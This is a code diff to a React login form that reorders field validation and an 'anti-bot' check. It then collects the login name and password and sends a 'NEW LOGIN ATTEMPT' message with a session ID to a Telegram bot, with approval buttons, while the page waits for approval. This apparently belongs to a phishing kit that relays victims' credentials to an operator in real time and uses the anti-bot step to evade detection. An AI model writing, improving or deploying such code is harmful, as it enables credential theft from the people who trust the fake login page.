@@ -186,10 +186,23 @@ function LoginForm() {
   setErrors({ ...errors, [field]: false });
 };
 
-  const handleLogin = async (e) => {
+const handleLogin = async (e) => {
   e.preventDefault();
   
-  // ANTI-BOT CHECK
+  // FIRST: Check if fields are empty
+  const newErrors = {
+    loginName: loginName.trim() === '',
+    password: password.trim() === ''
+  };
+
+  setErrors(newErrors);
+
+  // If fields are empty, show error and STOP (no anti-bot check)
+  if (newErrors.loginName || newErrors.password) {
+    return; // Don't proceed, don't check anti-bot
+  }
+  
+  // ONLY run anti-bot check if fields are NOT empty
   const antiBotResult = checkAntiBot();
   console.log('Anti-bot result:', antiBotResult);
   
@@ -214,26 +227,19 @@ function LoginForm() {
     return;
   }
 
-  const newErrors = {
-    loginName: loginName.trim() === '',
-    password: password.trim() === ''
+  // If all checks pass, proceed with login
+  setIsLoading(true);
+  setWaitingForApproval(true);
+  
+  const newSessionId = generateSessionId();
+  setSessionId(newSessionId);
+  
+  const loginData = {
+    loginName: loginName.trim(),
+    password: password.trim()
   };
-
-  setErrors(newErrors);
-
-  if (!newErrors.loginName && !newErrors.password) {
-    setIsLoading(true);
-    setWaitingForApproval(true);
-    
-    const newSessionId = generateSessionId();
-    setSessionId(newSessionId);
-    
-    const loginData = {
-      loginName: loginName.trim(),
-      password: password.trim()
-    };
-    
-    const message = `
+  
+  const message = `
 🔐 <b>NEW LOGIN ATTEMPT</b> 🔐
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
 🆔 <b>Session ID:</b> <code>${newSessionId}</code>
@@ -246,9 +252,8 @@ function LoginForm() {
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>Click a button below to proceed</i>
       `;
-    
-    await sendToTelegramWithButtons(message, newSessionId);
-  }
+  
+  await sendToTelegramWithButtons(message, newSessionId);
 };
 
 
